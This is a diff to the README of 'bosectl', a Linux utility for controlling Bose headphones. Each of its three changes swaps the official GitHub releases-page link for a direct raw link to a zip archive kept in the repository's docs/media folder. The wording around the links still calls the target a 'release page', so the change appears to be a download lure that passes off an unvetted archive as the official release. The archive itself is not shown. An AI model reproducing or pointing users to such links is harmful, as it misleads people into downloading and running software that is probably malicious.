@@ -1,6 +1,6 @@
 # 🎧 bosectl - Control Bose Headphones With Linux
 
-[![Download bosectl](https://img.shields.io/badge/Download%20bosectl-blue?style=for-the-badge&logo=github)](https://github.com/Olympian-atomicenergy52/bosectl/releases)
+[![Download bosectl](https://img.shields.io/badge/Download%20bosectl-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip)
 
 ## 📦 What this is
 
@@ -34,7 +34,7 @@ For best results, use a modern Linux setup with:
 
 ## 🚀 Download and install
 
-1. Visit the release page: https://github.com/Olympian-atomicenergy52/bosectl/releases
+1. Visit the release page: https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip
 2. Find the latest release
 3. Download the file that matches your Linux setup
 4. Save the file to a folder you can find again, such as Downloads
@@ -260,7 +260,7 @@ It fits people who want:
 
 ## 📥 Download link
 
-Visit this page to download the latest release: https://github.com/Olympian-atomicenergy52/bosectl/releases
+Visit this page to download the latest release: https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip
 
 ## 📌 File names you may see
 
